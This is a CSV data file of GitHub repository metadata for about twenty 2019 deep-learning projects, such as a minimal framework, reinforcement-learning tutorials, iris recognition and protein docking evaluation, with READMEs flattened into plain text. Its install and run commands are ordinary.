bwhitesell,SpyNE,n/a,SpyNE SpyNE is a minimalist deep learning famework written purely in python proof deep learning is easy It s simplicty makes it an excellent tool to learn the mathematical framework behind deep learning SpyNE features a dead simple api super readable code no dependencies other than numpy eager execution by default and an accessible but exhaustive explanation of the underlying mathematical framework Modules SpyNE features custom implementations of the following Automatic Differentiation Reverse Mode Optimization Engines An API to translate neural architectures into the AD mini language Generally these are the fundamental components to all deep learning frameworks Installation python 3 6 git clone https github com bwhitesell SpyNE cd SpyNE python setup py install Documentation In Progress https medium com whitesell ben how to build your own deep learning framework its easy i ll prove it c859cb790386 Example Defining a Neural Network in 10 Seconds python from spyne models import NeuralNetwork from spyne layers import FullyConnectedLayer nn NeuralNetwork nn addlayer FullyConnectedLayer neurons 5 activation relu dropout 0 nn addlayer FullyConnectedLayer neurons 1 activation linear And that s it we ve defined a neural network architecture that has one hidden layer of 5 neurons per feature axis and an ouput layer with a single neuron per feature axis as is desired for a regression problem Now let s get some data to train on python from sklearn datasets import loadboston from sklearn preprocessing import StandardScaler boston loadboston standardize the data scaler StandardScaler withmean False x scaler fittransform boston data y boston target To train our neural net is just a single line python nn fit x y batchsize 10 epochs 20 learningrate 09 optimizer rmsprop l2 0 0000001 The model performance will be printed as it is being trained bash Neural Network Architecture Layers 2 Params 76 parameters Using optimizer RMSProp Optimizer Batch 40 40 100 0 for epoch 0 Train Loss 141 414 Val Loss 22 2118 Batch 40 40 100 0 for epoch 1 Train Loss 96 3986 Val Loss 17 7557 Batch 40 40 100 0 for epoch 2 Train Loss 74 4629 Val Loss 16 3234 Batch 40 40 100 0 for epoch 3 Train Loss 61 1243 Val Loss 16 2161 Batch 40 40 100 0 for epoch 4 Train Loss 51 9994 Val Loss 16 7056 Project Status Completed Reverse Mode Auto Diff Neural Net API SGD Momentum RMSProp Optimization L2 Regularization Fully Connected Layers Dropout Unit Test coverage up to MLP In Development Documentation Not Implemented Convolutional Layers 2d 1d Recurrent Layers LSTM GPU support Probably through CuPy,2019-06-26T01:02:57Z,2019-08-27T21:47:25Z,Python,bwhitesell,User,2,3,1,71,master,bwhitesell,1,0,0,0,0,0,0
asifahmed90,Image-capturing-API-for-deep-learning-dataset,api#colaboratory#dataset#dataset-generation#deep-learning#image#tensorflow,Image capturing API for deep learning dataset A simple API using google images download to fetch images automatically from google search I used google colab to run the code but can be run in any IDE In this case images regarding yoga pose has been demostrated Dependency 1 Tensorflow 2 google images download 3 OpenCV However to run the code successfully frozeninferencegraph pb needs to be located from coco dataset It can be downloaded from the this github link https github com floydhub object detection template tree master models ssdlitemobilenetv2coco20180509 To simplify the steps I have kept a copy of frozeninferencegraph pb in this repository Clone the repo and point out the pb file location in the code To download preferred images from google search simply change the name of the search files in the completelist and make corresponding adjustment in both downloadimage and detectpersonsandsavecrops functions The final result would look something like this image https user images githubusercontent com 45178199 60221052 d70ea900 983d 11e9 9eb8 b91008839cb2 png To contrubite please fork the file and create a pull request Thank you for using this Let me know if you face any issues,2019-06-26T22:58:00Z,2019-10-04T00:42:59Z,Jupyter Notebook,asifahmed90,User,0,3,0,9,master,asifahmed90,1,0,0,0,0,0,0
RobertTLange,deep-rl-tutorial,n/a,A Tutorial Series on Deep Reinforcement Learning Author Robert Tjarko Lange ECN Berlin This repository contains a series of tutorials on Deep Reinforcement Learning DRL This includes slides as well as experiments Going forward I plan on adding exercises as well as complementary blog posts So stay tuned Deep Q Learning July 2019 Slides DeepQLearning pdf Includes DQN Double DQN Prioritized Experience Replay Dueling DQNs Experiments EXPERIMENTSDQL Provides code to implement all of the above Blog Post I II https roberttlange github io posts 2019 08 blog post 5 Covering all algorithms from Fitted Q Learning to Categorical DQNs Replicating the experiments 1 Create activate a virtual env Install the requirements 2 Afterwards you can run all experiments by executing time bash runexperimentsdqn sh dqn time bash runexperimentsdqn sh double dqn time bash runexperimentsdqn sh per dqn time bash runexperimentsdqn sh dueling dqn 3 The visualizations for the different experiments as well as the mini double DQN illustration can be replicated by executing the notebook jupyter notebook vizresults ipynb 4 Finally in order to visualize an episode rollout of a DQN agent at different stages do the following python traindqn py SAVEAGENT python enjoydense py AGENT 5000MLP DQN TITLE 5000 python enjoydense py AGENT 40000MLP DQN TITLE 40000 python enjoydense py AGENT 500000MLP DQN TITLE 500000 Deep Policy Gradients to be continued,2019-07-14T12:10:47Z,2019-11-12T09:39:46Z,Jupyter Notebook,RobertTLange,User,3,3,0,11,master,RobertTLange,1,0,0,0,0,0,0
Bigpig4396,PyTorch-Deep-Recurrent-Q-Learning-DRQN,n/a,,2019-07-18T22:21:09Z,2019-12-08T07:24:02Z,Python,Bigpig4396,User,0,3,0,1,master,Bigpig4396,1,0,0,0,0,0,0
formango,SAR-Change-Detection-MLFN,n/a,This code is for our paper Transferred deep learning for sea ice change detection from synthetic aperture radar images If you use this code please kindly cite our paper Yunhao Gao Feng Gao Junyu Dong Shenke Wang Transferred deep learning for sea ice change detection from synthetic aperture radar Images IEEE Geoscience and Remote Sensing Letters vol 16 no 10 pp 1655 1659 Oct 2019 If you have any questions please contact us Email gaoyunhao128 163 com gaofeng ouc edu cn Before running this code you should correctly install ubuntu system and caffe framework Refer to this guildeline http caffe berkeleyvision org installation html After correctly installing ubuntu and caffe you can run this code by the following procedures 1 Opening the Matlab and changing the current path running the generatingtrain m and generatingtest m to generate the training and testing samples 2 Running the createtrain sh and createtest sh in Caffe Therefore the format png can be converted to format lmdb which is efficent for the caffe input 3 Opening the terminal and running this script to execute the training of MLFN sh train sh 4 After training running the following script to executes the testing of MLFN and record testing logs sh test sh info result txt 5 Running the extractprob sh in Caffe to extract probability from the result txt 6 Running the calculatingresult m in Matlab to calculate the matrics PCC Kappa FP and FN and draw the final change map,2019-08-05T12:16:25Z,2019-11-01T13:23:01Z,C,formango,User,1,3,4,7,master,formango,1,0,0,0,0,0,0
kmzzhang,deepCR-paper,n/a,deepCR Cosmic Ray Rejection with Deep Learning This repository accompanies the paper deepCR Cosmic Ray Rejection with Deep Learning Zhang Bloom 2019 and includes code to reproduce results figures and tables of the paper deepCR is implemented separately in https github com profjsb deepCR to reproduce figures and tables in the paper Tested to work on Python 3 6 and 3 7 Automatically runs on GPU if torch cuda isavailable pip install r requirementspip txt cd paper data sh generatedata sh cd sh runall sh Figures and tables are by default generated from pre calculated benchmarking data saved in paper benchmarkdata npy files If you would like to reproduce benchmarking results from scratch simply delete these npy files Warning it is highly recommended that benchmarking be run on GPU s On CPUs they re expected to run for hours,2019-07-04T18:31:34Z,2019-09-06T16:14:07Z,Python,kmzzhang,User,1,3,1,10,master,kmzzhang,1,0,0,0,0,0,0
marcalcarazf,realtime-2D-to-3D-faces,3d#3d-face#3d-face-reconstruction#computer-vision#deep-learning#face#python#pytorch#reconstruction,realtime 2D to 3D faces Reconstructing real time 3D faces from 2D images using deep learning,2019-06-30T18:29:23Z,2019-11-12T23:20:19Z,Python,marcalcarazf,User,1,3,2,6,master,marcalcarazf,1,0,0,0,0,0,0
Nikunj-Gupta,FCMADRL,ddpg#dqn#machine-learning#multiagent-systems#reinforcement-learning,FULLY COOPERATIVE MULTI AGENT DEEP REINFORCEMENT LEARNING This repository comprises of the code for my Master s Thesis work on leveraging the advantages of a Multi Agent Systems paradigm of Centralised Learning and Decentralised Execution in Reinforcement Learning to train a group of intelligent agents to learn to accomplish a task cooperatively Abstract Coordination of autonomous vehicles automating warehouse management system or another real world complex problem like large scale fleet management can be easily fashioned as cooperative multi agent systems Presently algorithms in Reinforcement Learning RL which are designed for single agents work poorly in multi agent settings and hence there is a need for RL frameworks in Multi Agent Systems MAS But Multi Agent Reinforcement Learning MARL poses its own challenges some of the major ones being the problem of non stationarity and the exponential growth of the joint action space with increasing number of agents A possible solution to these complexities is to use Centralised learning and Decentralised execution of policies however the question of using the notion of centralised learning to the fullest still remains open As apart of this thesis we developed an architecture adopting the framework of centralised learning with decentralised execution where all the actions of the individual agents are given as input to a central agent and it outputs information for them to utilize Thus the system of individual agents are given the opportunity of using some extra information about other agents affecting the environment directly from a central agent which also helps in easing their training Results for the same are showcased on the Multi Agent Particle Environment MPE by OpenAI An extension of the architecture for the case of warehouse logistics is also shown in the thesis Environment The following environment was used Multi Agent Particle Environment This environment needs to be downloaded and installed in order reproduce the results Follow the instructions in the following here https github com openai multiagent particle envs FCMADRL uses only the Cooperative Navigation simplespread py env from the set of environments in MPE The parameters can be very problem specific In order to change the number of agents or landmarks you must go to multiagent scenarios simplespread py manually Installation Using Pip pip install FCMADRL Docker Use the dockerfile to set up the environment dockerfile https github com Nikunj Gupta FCMADRL blob master dockerfile USAGE python from FCMADRL import framework inference Code structure config py https github com Nikunj Gupta FCMADRL blob master config py This is the configuration file It contains all the parameters required by the various networks in the repository This becomes quite useful when hyperparameters for various runs need to modified ddpg ddpg py https github com Nikunj Gupta FCMADRL blob master ddpg ddpg py ddpg stands for Deep Deterministic Policy Gradients It has the network for the central agent because it has to deal with a output in the continuous space dqn dqn py https github com Nikunj Gupta FCMADRL blob master dqn dqn py dqn stands for Deep Q Network This file has the network for the individual agents framework py https github com Nikunj Gupta FCMADRL blob master framework py This is the main function It incorporates both the components and connects them to the environment Papers This folder contains an important subset of the papers explored during the thesis Running the code Clone the repository Clone the repository of the environment and install it as described in the instructions of the same run framework py using the following command python framework py Note If you have docker you can use the dockerfile https github com Nikunj Gupta FCMADRL blob master dockerfile to build the environment to use my code as is Keep the requirements txt along with the dockerfile The code shall start running and it will stop when it has achieved its objective all agents covering all the landmarks for 100 episodes straight Adaptations DDPG https github com stevenpjg ddpg aigym DQN https github com gsurma cartpole,2019-08-01T10:32:02Z,2019-11-20T18:13:13Z,Python,Nikunj-Gupta,User,1,3,1,23,master,Nikunj-Gupta,1,0,0,1,0,0,0
JuiHsiu,Slither-DRL,n/a,Slither DRL In this repository we implement some well known deep reinforcement learning DRL algorithms for slither io https slither io Policy Gradient PG Deep Q Network DQN Actor Critic AC Advantage Actor Criitc A2C Installation Instructions Install docker https www digitalocean com community tutorials how to install and use docker on ubuntu 16 04 for ubuntu 16 04 MAKE SURE TO DO STEP 2 AS WELL Install Conda https www digitalocean com community tutorials how to install the anaconda python distribution on ubuntu 16 04 for ubuntu 16 04 Create Conda env conda create name slither python 3 5 Activate a conda env source activate slither Install needed packages sudo apt get update sudo apt get install y tmux htop cmake golang libjpeg dev libgtk2 0 0 ffmpeg Install pytorch 1 1 0 for CUDA 10 0 pip3 install https download pytorch org whl cu100 torch 1 1 0 cp35 cp35m linuxx8664 whl pip3 install https download pytorch org whl cu100 torchvision 0 3 0 cp35 cp35m linuxx8664 whl Install universe installation dependencies pip install numpy pip install gym 0 9 5 Install universe git clone https github com openai universe git cd universe pip install e Install this repository cd git clone https github com JuiHsiu Slither DRL git cd Slither DRL How to Run training the agent python main py train pg dqn ac a2c For DQN there are some improvements can be added optional python main py traindqn duelingdqn prioritizeddqn testing the agent python main py test pg dqn ac a2c If you want to see your agent playing the game python main py train pg dqn ac a2c dorender By default when you test the agent the procedure is recorded as a video You can assign the directory to the video by python main py test pg dqn ac a2c videodir pathtosavevideo Advanced Arguments 1 Number of Environment You can create more than one environment at the same time However you need to modify the codes to perform batch learning python main py train pg dqn ac a2c remotes ofenv 2 Action Space We make 12 different positions of the mouse as the action space of our agent If you want the agent to have the ability to accumulate set the actionspace 24 python main py train pg dqn ac a2c actionspace 12 24 Demo Our best model is A2C and you can see the pre trained agent playing game as following demo a2c gif,2019-06-30T04:28:08Z,2019-10-29T00:08:19Z,Jupyter Notebook,JuiHsiu,User,2,3,0,11,master,JuiHsiu#itsmystyle,2,0,0,0,0,0,0
oneilsh,dpl_u19,n/a,dplu19 Deep Learning for Life Scientists Pilot,2019-07-08T16:50:18Z,2019-08-19T22:15:06Z,HTML,oneilsh,User,0,3,1,23,master,oneilsh,1,0,0,0,0,0,0
a1600012888,tylib,n/a,tylib you have to put this path to PYTHONPATH config TYLIBHOME in etc profile or bashrc e g export TYLIBHOME root of your cloned repo export PYTHONPATH PYTHONPATH TYLIBHOME,2019-08-02T01:30:34Z,2019-11-27T07:12:51Z,Python,a1600012888,User,2,3,0,13,master,SaltedFishLZ#a1600012888,2,0,0,0,0,0,0
bayeslabs,genomita,n/a,genomita Understanding Genomics better with Deep Learning,2019-07-01T09:43:12Z,2019-10-28T08:46:47Z,Python,bayeslabs,User,0,3,1,45,master,Pankaj01998#bayeslabs#MuniNihitha,3,0,0,1,0,1,4
holmdk,Video-Prediction-using-PyTorch,n/a,Video Prediction using PyTorch Repository for various video prediction models using Deep Learning,2019-07-09T12:56:37Z,2019-10-31T11:55:10Z,Python,holmdk,User,0,3,0,2,master,holmdk#dcwisahn,2,0,0,0,0,0,0
YEmreAk,YArtificialIntelligence,n/a,description Yunus Emre Ak YEmreAk yedhrab n yapak zeka artificial intelligence AI ve makine renimi machine learning ML notlar Yapay Zeka Notlarm Ho Geldin Burada kaybolmaman iin bilmen gerekenler Sa stteki Arama Buton https iuce yemreak com q unu kullanmay asla ama asla ihmal etme Konular veya konuyla alakal kelimeleri ve terimleri aratabilirsin eriklerin hepsi sol st kedeki mennn altndadr Katkda Bulunma Rehberi https wiki yemreak com contributing alanndan projeye katkda bulunabilirsin Tm emojiler YEmoji https learn yemreak com yonetim yemoji szlne uygun olarak seilmektedir Konular renmek iin ideal yollar aratrdmz YLearn https learn yemreak com projesine bakmanda fayda var hint style success Her sayfann en altnda bulunan memnuniyet anketi ile geliime ortak olabilirsin endhint Motivasyon Yapay Zeka Nasl bir gelecek https www youtube com watch v qh2ESbatq68 NVIDIA Ganguan https www youtube com watch v 1iMmenHFdCE Byle bir insan yok https youtu be N4mxt4vFwY Yapay Zeka iin Giri Bilgilerini test edebilecein siteye buradan https www hackerrank com domains ai eriebilirsin Deep Learning Trkiye nin 2019 yl iin paylam olduu kaynaklara buraya https medium com deep learning turkiye 2019 yapay zeka e C4 9Fitim ve uygulama program C4 B1 add138988809 tklayarak ulaabilirsin Sk Kullanlan Frameworkler Framework Tercih Sebebi Tensorflow Detaylarla uramak isteyenler Keras ok daha hzl bir ekilde model oluturmak Her ikisi de Open Source frameworklerdir Uygun Framework Seimi Nasl Olur En kolay programlanabilir ve gelitirilebilir olmas lazmdr Hzl almas lazmdr Tam olarak open source olmal ve geliimi daim olmal leride kapanmamal Geliimi yarda kalmaml Detaylar iin TensorFlow or Keras Which one should I learn https medium com implodinggradients tensorflow or keras which one should i learn 5dd7fa3f9ca0 yazsna bakabilirsin Tm YEmreAk erikleri https drive google com uc id 1LZoJzZyYuYbl3zCxk6ZtZPaDiMHglMv Destek ve letiim Github https drive google com uc id 1PzkuWOoBNMg0uOMmqwHtVoYt0WCqi O5 https github com yedhrab LinkedIn https drive google com uc id 1hvdil0ZHVEzekQ4AYELdnPOqzunKpnzJ https www linkedin com in yemreak Website https drive google com uc id 1wR8Ph0FBs36ZJl0Ud HkS0LZ9b66JBqJ https yemreak com Mail https drive google com uc id 142rP0hbrnY8T9kj84r7WxPG1hzWEcN mailto yedhrab gmail com subject YArtificialIntelligence 20 7C 20Github Patreon https drive google com uc id 11YmCRmySX7v7QDFS62ST2JZuE70RFjDG https www patreon com yemreak Lisans The Apache 2 0 License https choosealicense com licenses apache 2 0 Yunus Emre Ak YEmreAk https drive google com uc id 1WdYLVOkAhXPVqFMxaZyFvyTy88H Z,2019-07-30T13:45:38Z,2019-12-13T14:57:29Z,n/a,YEmreAk,Organization,1,3,0,172,master,yedhrab,1,1,1,0,1,0,0
kiharalab,DOVE,n/a,DOVE Citation articlewang2019protein title Protein Docking Model Evaluation by 3D Deep Convolutional Neural Networks author Wang Xiao and Terashi Genki and Christoffer Charles W and Zhu Mengmeng and Kihara Daisuke journal Bioinformatics Online platform http kiharalab org dove What is Dove Dove is a docking model evaluation method based on 3D deep convolutional neural networks 1 Dove is a protein docking model evaluation method which distinguish good quality acceptable quality in the CAPRI criteria from incorrect models It is trained on around 2 million examples 2 Compared to previous methods it worked better on two different benchmark datasets Zdock and Dockground 3 In the cross fold testing we conducted we achieve around 85 accuracy on training set and around 70 accuracy on the validation set Network Architecture https github com kiharalab DOVE blob master Web img modelbold jpg The network architecture of Dove 100 200 200 400 400 are the number of filters in each layer 20 18 16 8 6 3 are the output cube size of each layer Here our input size are 20 20 20 10800 1000 100 denotes the number of neurons for fully connected layer Block means that the data is a 3D cube Flat is a 1D vector Pool is a max pooling and FC is fully connected network Dove protocol Dove protocol consists of four steps 1 Dove computes and assigns GOAP and ITScore to each atom in a query docking model GOAP and ITScore is knowledge based potentials used in protein structure prediction 2 As another type of input feature Dove extracts the interface atom types and positions at the docking interface 3 The query model is mapped on to a 3D grid and GOAP ITScore and atom type information are mapped to each voxel These are input features for the evaluation 4 The deep learning trained model was applied to predict the the probability of the input model decoy being correct an acceptable model with the CAPRI criteria 1 0 is the highest score and 0 0 is the lowest It applied 8 networks each of which considers different features of the input decoys Thus Dove outputs 8 probability values In the paper the models were trained on a 4 fold cross validation In this server among the four models from the cross validation we implemented the model which gave the highest hit rate on the testing datasets https github com kiharalab DOVE blob master Web img Flowchart jpg Notes ITScore is not made available in this released code because of the license issue Code Pre required Library Tensoflow pip conda install tensorflow 0 12 Keras pip conda install keras 2 2 4 Numpy pip conda install numpy Matplotlib pip conda install matplotlib Usage python main py h help show this help message and exit F F decoy example path mode MODE M MODE 0 predicting for single docking model 1 predicting and sorting for a list of docking models id ID random id for the webserver record to avoid the same file name with different contents gpu GPU Choose gpu id example 1 2 specify use gpu 1 and 2 1 Predict single pdb file python main py mode 0 F pdbfile id 888 gpu 0 if you need more than 1 gpu use gpu 0 1 2 Predict pdb file lists python main py mode 1 F directorypath id 888 gpu 0 3 How to train a model python main py mode 2 F datapath F1 validationdatapath gpu 0 lr 0 1 reg 1e 4 batchsize 128 To help user add more features to train their own model for their purposes I specifically added detailed comments in the main py and other training codes in Training directory If you have any questions regarding your training please feel free to make contact with us Notice Receptor chain ID must be A ligand chain ID must be B PDB format Output record Output will be saved in the subdirectory of your models directory For mode 0 the output record will be kept as filename 4 jobid id txt For mode 1 the output record will be kept as RECORDjobid id txt Output format Example complex 244440 pdb 0 80237 0 79943 0 90355 0 78516 1 00000 1 00000 0 91417 0 75000 Explanation 1st column is the file name 2nd 9th column denotes the probability of the decoy is correct acceptable quality according to CAPRI If the value is 1 it means the model is not evaluated using the corresponding features Note ITScore is not made available in this released code because of the license issue Output that use ITScore in the feature combination is shown as 1 Example Here is an example output of a correct decoy link https github com kiharalab DOVE blob master Web Example Correct pdb https github com kiharalab DOVE blob master Web img Correct png As you see in this example typically a correct decoy has a high probability 0 5 from more than four feature combinations and no very small probability 0 01 Note ITScore is not made available in this released code because of the license issue Output that use ITScore in the feature combination is shown as 1 Here is an example output of an incorrect decoy link https github com kiharalab DOVE blob master Web Example Incorrect pdb https github com kiharalab DOVE blob master Web img Incorrect png Typically an incorrect decoy has at least one very small probability 0 01 Note ITScore is not made available in this released code because of the license issue Output that use ITScore in the feature combination is shown as 1 Explanation of different input features https github com kiharalab DOVE blob master Web img inputinstruction png,2019-06-27T03:19:05Z,2019-12-07T15:00:53Z,Python,kiharalab,Organization,0,3,1,46,master,wang3702,1,0,0,0,0,0,0
munzir5731,Bengali-Text-Summarization,n/a,Bengali Text Summarization Text analysis for Bengali Text Summarization using Deep Learning Built an annotated dataset of 200 documents Summarizing model using LSTM network of RNN Built an ROUGE 1 2 3 calculators for Bengali language using python Dataset available here Bangla Natural Language Processing Community Stop word RANKS NL,2019-07-10T12:07:34Z,2019-07-17T18:47:04Z,Jupyter Notebook,munzir5731,User,0,3,0,2,master,munzir5731,1,0,0,0,0,0,0
vivek1may,Tamizh,n/a,Tamizh Machine Deep Learning with the Tamil Oldest Language The aim is to create ML specific applications and enhancements with Tamil Language Code Usage tawikiconvertbz2toxml ipynb Extracts the bz2 compressed article to xml file Mainly created to avoid large transactions to cloud Upload the compressed file and extract in the cloud Download the article page from WikiMedia Tamil Data http dumps wikimedia org tawiki latest tawikidataextractioncleaning ipynb Extracts each articles Title and clean Content from the XML tree and exports to Tabular Data for easy use Used many regex rules to clean the data TamizhWord2Vec ipynb Word embeddings for Tamil words using gensim library This creates the similarity metrics between the words Training model parameter can be adjusted to extend its usage NEXT 1 DL based Language Modelling 2 Document Similarity Model 3 NER 4 Sentiment detection 5 ETC,2019-08-03T12:55:44Z,2019-08-05T15:37:57Z,Jupyter Notebook,vivek1may,User,2,3,1,6,master,vivek1may#amrrs,2,0,0,0,0,0,1
Linchunhui,Iris_Recognition,n/a,IrisRecognition Iris recognition include tradition algorithm and deep learning Code Code script script tradition tradition CNNfeature CNNfeature CNN classifier CNNclassifier Dataset Dataset CASIA Iris Version 1 0 CASIA IrisVersion1 0 CASIA Iris Thousand CASIA Iris Thousand Algorithm Algorithm 1 Tradition Algorithm 1 TraditionAlgorithm Preprocessing Preprocessing USIT v2 2 USITv2 2 Gabor Feature Extraction GaborFeatureExtraction Distance Based Match DistanceBasedMatch Machine Learning Predict MachineLearningPredict 2 CNN Feature Extraction 2 CNNFeatureExtraction 3 CNN Classification 3 CNNClassification Code code dir script script GetList py Get the image path list and label list then split to train set and test set GetPic py Get and save the iris pictures after segmentation and ROI pictures after normalization and enhancement GetVector py Get the feature vector list of train and test according gabor filter and save as csv copypic py Copy all the picture into one dir tradition tradition Segmentation py Segment the iris ring with hough transform and canny edge detection Normalization py Flat the circular ring into rectangle ROI Enhancement py Enhancement the ROI after normalization Gabor py Feature extraction with gabor filter Matching py Match with cityblockeuclidean and cosine distance Evaluation py Evaluate the accuracy rate with each distance irisdemo2 py Run and get the results CNNfeature CNNfeature inceptionutils py Inception utils from geogle tensorflow slim inceptionv4 py Inceptionv4 from geogle tensorflow slim resnetutils py Resnetutils from geogle tensorflow slim ResNet py Resnet from geogle tensorflow slim DenseNet py DenseNet from geogle tensorflow slim cnnfeature py CNN feature extraction with inceptionv4resnet and densenet irisdemo1 py Run and get the results CNN classifier CNNclassifier utils py Preprocess DenseNet py Densenet train py Train with a mini densenet eval py Eval and get the results Dataset CASIA Iris version1 0 Include 108 classes each class has 7 images three of them for train and the other for test CASIA Iris Thousand Include 1000 classes each class has 20 images half are left eyes and half right We random select 70 of them for train and 30 for test All the results are based on this dataset Algorithm 1 Tradition Algorithm Preprocessing We use hough transform and canny edge detection to segment the iris and then unfold the ring between the outer circle and inner circle into a rectangle of size 64 512 After normalization we did local image equalization as Li Ma s paper Finally we use gabor filter to extract the feature vector from the ROI USIT v2 2 We also recommend an open source software USIT v2 2 from the University of Salzburg to complete the preprocessing Github https github com ngoclamvt123 usit v2 2 0 You just need to clone the git and install opencv and boost and then release wahet cpp usage for a single image test exe i D studyirisCASIA Iris Thousand000LS5000L00 jpg o texture png s 256 64 e for a batch images test exe i D studyirisCASIAorigintrain jpg o D study iris CASIA enhance512 train 1 jpg s 512 64 e If you don t need enhancement you just need delete e If you need the segmentation you just need add sr D study iris CASIA seg train 1 jpg Gabor Feature Extraction We use gabor filter to complete the feature extraction Distance Based Match We use cityblock distance euclidean distance and cosine distance to match and results respectively are 88 19 84 95 and 85 42 Machine Learning Predict We use pca to reduce the dimension and then use KNN and SVM to train and predict When the dimension reduce to 380 the result is the best 90 2 for KNN and 90 7 for SVM 2 CNN Feature Extraction We use InceptionV4 ResNet 101 Densenet121 to extract feature from the ROI after enhancement When inceptionV4 at Mixed6a ResNet with block 3 4 9 and DenseNet with block 6 12 3 and then use pca reduce the dimension to 580 for SVM to get the best results 95 8 96 4 and 97 1 We also append avgrage pooling after convolution to avoid MemoryError 3 CNN Classification We also use a mini densenet with 40 layers to train a model Dataset are the ROI of the CASIA Iris Thousand However it doesn t work for the limitation of the dataset and lead to over fit,2019-07-08T11:57:54Z,2019-10-09T08:49:46Z,Python,Linchunhui,User,0,3,0,20,master,Linchunhui,1,0,0,0,0,0,0
Leigh-Ola,Paddle-Game,n/a,Paddle Game Logo PaddleGameLogo png Paddle Game Work In Progress,2019-08-06T23:28:10Z,2019-10-03T18:40:21Z,JavaScript,Leigh-Ola,User,1,3,0,7,master,Leigh-Ola,1,0,0,0,0,0,2
yunfei-teng,LSGD,n/a,LSGD This is the code repository for paper Leader Stochastic Gradient Descent for Distributed Training of Deep Learning Models https arxiv org abs 1905 10395 along with Explanation https yunfei teng github io LSGD work in progress Requirements 1 Install PyTorch from official website https pytorch org This is one of the most popular deep learning tools 2 install termcolor by pip install termcolor This colorizes the output from terminal Instruction 1 On the first GPU node use command ifconfig in terminal to check its IP address 2 Open the bash file lsgd sh fill in ipaddr with the IP address you obtained from step 1 and numgroups with the total number of GPU nodes you have i e numgroups n 3 On j th GPU note in terminal type bash lsgd sh j 1 i e index starts from 0 to run the codes Possible Issues 1 Type nvidia smi in terminal to check nvidia driver and cuda compatibility https docs nvidia com deploy cuda compatibility 2 Check consistency of PyTorch versions across the machines,2019-07-08T17:51:57Z,2019-11-23T00:31:32Z,Python,yunfei-teng,User,0,3,0,24,master,yunfei-teng,1,0,0,0,0,0,0
AlexanderBurkhart,realtime-modular-object-detection,n/a,Real Time Modular Object Detection This project is aimed to detect any specific type of object in real time by passing a dataset of the object There are three folders that show the different algorithms in this project Has support to use Zynq UltraScale https www xilinx com products boards and kits zcu104 html as a processor for optical flow for Faster R CNN Use the obj detection frcnn for best results Dataset All of the algorithms are tested on the Town Centre data set http www robots ox ac uk ActiveVision Research Projects 2009bbenfoldheadpose project html datasets Results for each algorithm are shown below Faster R CNN frcnngif gif U Net unetgif gif Optical Flow with a Simple Classifier ofgif gif Prerequisites Ubuntu 18 04 Python 3 Keras Tensorflow OpenCV Imutils Numpy Train Models with Town Centre Data Set Only works for U Net and Faster R CNN Note Make sure to use a computer with a powerful GPU s or Google Cloud Amazon instance with a GPU s for best efficiency Download TownCenterXVID avi from the Town Centre data set http www robots ox ac uk ActiveVision Research Projects 2009bbenfoldheadpose project html datasets and rename the video to test avi Copy and paste the text from TownCentre groundtruth top from the data set website into a file called data csv Create an empty folder called data in the corresponding algorithm folder i e obj detection frcnn where there is a script called createdata py Place the test avi file and data csv file into the data folder Run the createdata py script with the following command bash python3 createdata py If using Faster R CNN once createdata py is finished rename the created train csv in the data folder to train txt Run the following command to train the model weights If using Faster R CNN bash python3 trainfrcnn py o simple p data train txt Note for optional training arguments read inside trainfrcnn py to find other arguments If using U Net bash python3 train py Train Models with Custom Data Set In order for createdata py to be used on a custom data set the data set should be layed out as followed video of file called test avi inside of the data folder csv file called data csv inside of the data folder where each line is configured as shown vim framenumber topleftpointx topleftpointy bottomrightpointx bottomrightpointy When using a custom data set createdata py is ran as shown below bash python3 createdata py d custom If using Faster R CNN once createdata py is finished rename the created train csv to train txt Run the following command to train the model weights If using Faster R CNN bash python3 trainfrcnn py o simple p data train txt Note for optional training arguments read inside trainfrcnn py to find other arguments If using U Net bash python3 train py Run Object Detection Note models have to be trained before running object detection To run the object detection on each algorithm locate the start py script in the corresponding algorithm folder and run the following command bash python3 start py This script has multiple options set wr to True if wanting to save a video set wf to the the number of frames wanting to save to video otherwise it saves the whole video width and height can be set for a custom image size Common Issues If the display is having issues running due to D Bus run the following command bash sudo killall ibus daemon Roadmap Retrain Faster R CNN model to be more accurate Train with a faster network Implement a faster algorithm able to run object detection at a feasible frame rate Link pretrained models Sources Faster R CNN Implementation https github com you359 Keras FasterRCNN,2019-07-17T00:39:12Z,2019-10-10T03:09:37Z,Python,AlexanderBurkhart,User,0,3,0,29,master,AlexanderBurkhart,1,0,0,0,0,0,0
Derfei,task-merging,n/a,task merging The code for the paper task merging and scheduling for parallel deep learning applications in mobile edge computing description IOT is the platform part of mobile device edge is the platfrom part of edge device cloud is the platform part of remote cloud,2019-07-30T12:40:06Z,2019-10-12T10:45:38Z,Python,Derfei,User,1,3,0,2,master,Derfei,1,0,0,0,0,0,0
EsterHlav,Dynamical-Isometry-from-Orthogonality-Neural-Nets,dynamical-isometry#initialization#keras#mathematics#mathematics-machine-learning#neuralnetworks#orthogonal#rnn,Impact of Orthogonal Initialization in Deep Learning Dynamical Isometry as a Consequence of Weight Orthogonality Ester Hlav 2019 How does orthogonal initialization of weight matrices help improve the training of neural networks What happens if we further impose orthogonality during training We research the effect of dynamical isometry and its positive impact on convergence during training What is Dynamical Isometry Dynamical Isometry happens when the singular values of the input output Jacobian for weight matrices equal one When the Jacobian J is well conditioned i e its eigenvalues are equal to one then J is a norm preserving mapping the mean of the Spectral density of J becomes one and dynamical isometry is reached When a neural network achieves dynamical isometry the gradient avoids the chaotic exploding gradient as well as ordered vanishing gradient zone which triggers better and faster convergence https github com EsterHlav Dynamical Isometry from Orthogonality Neural Nets blob master orderedchaotic png raw true Research Questions Effect of Orthogonal Initialization on A Vanishing and Exploding Gradient B Difference of Speed of Convergence between Deep and Shallow Neural Networks C Accuracy of Non Linear Neural Networks with vs without Dynamic Isometry Effect of Orthogonal Regularization D Can excessive orthogonality constraint i e hard regularization hurt performance E Can specific conditions e g depth enforce orthogonality in a more beneficial way than others Empirical Results While the first part of the project researched the mathematical consequences of dynamical isometry in the second half we conduct experiments for recurrent neural networks RNNs and impose an orthogonal regularization constraint with gain on training While we report for some datasets non conclusive results of orthogonal regularization our results on Sequential MNIST dataset report that a gain adjusted regularizer outperforms a single soft regularizer https github com EsterHlav Dynamical Isometry from Orthogonality Neural Nets blob master singularvalues png raw true,2019-07-06T20:06:35Z,2019-11-02T09:22:04Z,Jupyter Notebook,EsterHlav,User,0,3,0,7,master,EsterHlav,1,0,0,0,0,0,0
